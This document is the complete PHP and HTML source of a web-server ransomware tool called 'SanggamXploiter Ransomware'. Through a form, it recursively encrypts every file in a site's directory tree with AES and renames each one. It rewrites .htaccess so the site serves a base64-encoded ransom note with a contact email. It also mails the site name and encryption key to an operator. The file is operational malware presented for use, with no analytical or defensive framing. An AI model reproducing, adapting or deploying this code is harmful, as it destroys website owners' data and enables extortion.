<!DOCTYPE html>
<html>
<head>
   <title>SanggamXploiter</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaZeusSec1337")){
      rename(".htaccess", ".htaZeusSec1337");
      if(fwrite(fopen('.htaccess', 'w'), "#SumatraXploit\r\nDirectoryIndex ZeusSec1337.php\r\nErrorDocument 404 /ZeusSec1337.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("ZeusSec1337.php",base64_decode("IA0KICAgICAgIDwhRE9DVFlQRSBodG1sPg0KPGh0bWw+DQo8aGVhZD4NCiAgIDx0aXRsZT5TYW5nZ2FtWHBsb2l0ZXIgUmFuc29td2FyZTwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYm9keSB7DQogICAgYmFja2dyb3VuZDogIzFBMUMxRjsNCiAgICBjb2xvcjogI2UyZTJlMjsNCn0NCmF7DQogICBjb2xvcjpncmVlbjsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8cHJlPiAgICAgDQogICAgIGAveW1NTU1NTU1NTW15L2ANCiAgICAgYC95bU1NTU1NTU1NTU1NTU1NbXkvYA0KICAgIC9oTU1NTU1NTU1NTU1NTU1NTU1NTU1NTWgvDQogICAvbU1NbU5NTU1NTU5OTk5OTk5OTU1NTU1OTk1NbS8NCiAgICBgaE5tbzpkTU1OTk5tTk5tTk5tTk5tTk5OTU1kOm9tTmhgDQogICAgIC5taDorL2hNTk5OTm1OTm1OZGhtbU5ObU5OTk5NeS9vOmhtLg0KICAgICBgZCs6Ly9zTm1NTU1tTU1NbWR5Ky9tTU1NbU1NTW1Ocy8vLytkYA0KICAgICB5cy5vL29NbU5OTm1OTk1OTk1tZE1OTk1OTm1OTk5tTW8vby55cw0KICAgIGBteS4tL05tTU1NTW1NTU5tTk55eU5ObU5NTW1NTU1NbU4vOmB5bWANCiAgICAtaC8rcy9NbU1NTU5tTk5OZHltKytteW1OTk5tTk1NTm1NOnNvL2gtDQogICAgLU4uby5zTW1NTU1OaC86LWAtTW9zTS1gLTovaE5NTU1tTXMuKy5OLQ0KICAgIGBoby8tb2htTU1NTS8gICAgLU0vK00uICAgIC9NTU1NbWhvLS9vaA0KICAgICBzKy1zLW9kbU5OTmAgICAgIC8tOi8gICAgIC5OTk5tZCs6cy0rcw0KICAgICBgbW8vLToreW1NbSAgICAgICAgICAgICAgICBtTW1zKzotL29tYA0KICAgICAgLmgvKy95YGhocyAgICAgICAgICAgICAgICB5eWhgeS8rL2guDQogICAgIGBoZC86Oi0rLiAgICAgICAgICAgICAgICAuKy06Oi9keWANCiAgICAgIC9ocysvOjouLS0gICAgICAgICAgLS0uOjovK3NoOg0KICAgICAgOmhkcysvLWAgICAgICAgICAgYC0vK3NkaDoNCiAgICAgIC95bU0rICAgICAgICAgIG9NbXk6DQogICAgICAgU0FOR0dBTVhQTE9JVEVSIFJBTlNPTVdBUkUNCiAgIC1bIENvbnRhY3QgOiBhbm9uc2VjNDQ0NEBnbWFpbC5jb20gXS0NCllvdXIgc2l0ZSBpcyBsb2NrZWQsIHBsZWFzZSBjb250YWN0IHZpYSBlbWFpbDoNCiAgICAgLVsgPGZvbnQgY29sb3I9ImdyZWVuIj5hbm9uc2VjNDQ0NEBnbWFpbC5jb208L2ZvbnQ+IF0tDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpUaGlzIGlzIGEgbm90aWNlIG9mIDxhIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JhbnNvbXdhcmUiPnJhbnNvbXdhcmU8L2E+Ljxicj4NCkhvdyB0byByZXN0b3JlIHRoZSBiZWdpbm5pbmc/DQpQbGVhc2UgY29udGFjdCB1cyB2aWEgZW1haWwgbGlzdGVkDQo8L3ByZT4NCjwvY2VudGVyPg0KPC9ib2R5Pg0KPC9odG1sPg=="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  ZeusSec1337.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htaZeusSec1337") ){
        if( unlink(".htaccess") && unlink("ZeusSec1337.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> ZeusSec1337.php (Default Page)<br>';
        }
        rename(".htaZeusSec1337", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"Zeus.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"ZeusSec1337.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htaZeusSec1337") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========     SanggamXploiter Ransomware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= SanggamXploiter (2016) Ransomware =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <ransomeware@ZeusSec1337.today>\r\n";
        mail("-- YOUR EMAIL --",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".ZeusSec1337");
        break;
        case '2':
          $locates = str_replace(".ZeusSec1337", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>

     `/ymMMMMMMMMmy/`
     `/ymMMMMMMMMMMMMMMmy/`
    /hMMMMMMMMMMMMMMMMMMMMMMh/
   /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/
    `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`
     .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.
     `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`
     ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys
    `my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`
    -h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-
    -N.o.sMmMMMNh/:-`-MosM-`-:/hNMMMmMs.+.N-
    `ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh
     s+-s-odmNNN`     /-:/     .NNNmd+:s-+s
     `mo/-:+ymMm                mMms+:-/om`
      .h/+/y`hhs                yyh`y/+/h.
     `hd/::-+.                .+-::/dy`
      /hs+/::.--          --.::/+sh:
      :hds+/-`          `-/+sdh:
      /ymM+          oMmy:
       SANGGAMXPLOITER RANSOMWARE
   -[ Contact : anonsec4444@gmail.com ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>
</html>


<?php

?>
